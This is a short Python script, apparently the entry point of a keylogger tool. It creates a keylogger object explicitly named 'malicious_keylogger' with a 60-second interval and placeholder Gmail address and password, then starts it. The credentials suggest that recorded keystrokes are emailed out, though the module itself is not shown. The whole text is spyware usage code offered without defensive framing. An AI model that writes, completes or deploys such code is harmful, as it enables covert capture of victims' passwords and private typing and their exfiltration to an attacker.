# Initialize / create keylogger
import keylogger

malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'write_email_here@gmail.com', 'email_password')

# Execute Keylogger
malicious_keylogger.start()